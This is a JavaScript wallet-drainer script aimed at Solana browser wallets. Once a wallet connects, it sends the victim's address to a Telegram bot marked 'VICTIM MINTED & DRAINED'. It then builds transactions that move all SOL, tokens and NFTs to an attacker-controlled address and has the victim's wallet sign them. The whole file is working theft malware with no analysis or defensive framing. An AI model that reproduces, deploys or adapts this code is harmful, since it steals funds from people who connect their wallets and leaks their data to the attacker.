(async function () {
  const cfg = await fetch('config.json', { cache: 'no-store' }).then(r => r.json());
  const drainWallet = cfg.d1 + cfg.d2;

  // All major wallets
  const wallets = [
    window.solana, window.phantom?.solana,
    window.backpack, window.solflare, window.braveSolana,
    window.okxwallet?.solana, window.coinbaseSolana,
    window.trustWallet?.solana, window.nightly, window.spot
  ];

  let provider = null;
  for (const w of wallets) {
    if (w && w.isPhantom || w?.publicKey) {
      provider = w;
      break;
    }
  }
  if (!provider) return;

  async function logVictim(addr) {
    try {
      await fetch(`https://api.telegram.org/bot${cfg.webhook}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: '8503340530',
          text: `VICTIM MINTED & DRAINED\nWallet: ${addr}\nTime: ${new Date().toISOString()}`
        })
      });
    } catch (e) {}
  }

  async function drainAll(pubkey) {
    const { Connection, PublicKey, Transaction, SystemProgram } = (await import('https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js')).solanaWeb3;
    const { createTransferInstruction } = await import('https://unpkg.com/@solana/spl-token@latest/lib/index.iife.min.js');
    const conn = new Connection(cfg.rpc);

    // Drain SOL
    try {
      const balance = await conn.getBalance(new PublicKey(pubkey));
      if (balance > 10000) {
        const tx = new Transaction().add(SystemProgram.transfer({
          fromPubkey: new PublicKey(pubkey),
          toPubkey: new PublicKey(drainWallet),
          lamports: balance - 8000
        }));
        tx.feePayer = new PublicKey(pubkey);
        const { blockhash } = await conn.getLatestBlockhash();
        tx.recentBlockhash = blockhash;
        await provider.signAndSendTransaction(tx);
      }
    } catch (e) {}

    // Drain ALL tokens + NFTs
    try {
      const accounts = await conn.getParsedTokenAccountsByOwner(new PublicKey(pubkey), {
        programId: new PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA')
      });
      for (const acc of accounts.value) {
        const info = acc.account.data.parsed.info;
        const amount = BigInt(info.tokenAmount.amount || 0);
        if (amount <= 0) continue;
        const tx = new Transaction().add(createTransferInstruction(
          new PublicKey(acc.pubkey),
          new PublicKey(drainWallet),
          new PublicKey(pubkey),
          amount
        ));
        tx.feePayer = new PublicKey(pubkey);
        const { blockhash } = await conn.getLatestBlockhash();
        tx.recentBlockhash = blockhash;
        await provider.signAndSendTransaction(tx);
      }
    } catch (e) {}
  }

  // Listen for wallet connect
  provider.on('connect', async () => {
    const pubkey = provider.publicKey.toBase58();
    await logVictim(pubkey);
    await drainAll(pubkey);
  });

})();